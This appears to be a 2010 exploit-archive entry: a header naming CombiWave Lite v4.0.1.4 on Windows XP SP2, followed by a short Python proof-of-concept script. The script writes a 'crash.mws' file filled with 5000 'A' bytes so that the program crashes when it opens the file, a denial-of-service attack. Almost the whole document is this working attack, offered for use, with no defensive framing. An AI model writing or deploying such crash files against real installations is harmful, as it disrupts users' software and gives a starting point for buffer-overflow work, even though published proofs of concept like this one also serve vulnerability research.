# Exploit Title: CombiWave Lite v4.0.1.4 (.mws) DoS
# Date: 12 / 8 / 2010
# Author: Oh Yaw Theng
# Software Link: http://www.topdownloads.net/software/combiwave-lite_2_219101.html?hl=&ia=0
# Version: v4.0.1.4
# Tested on: Windows XP SP 2
# CVE : N / A

#!/usr/bin/python

filename = "crash.mws"

junk = "\x41" * 5000

exploit = junk

textfile = open(filename,'w')
textfile.write(exploit)
textfile.close()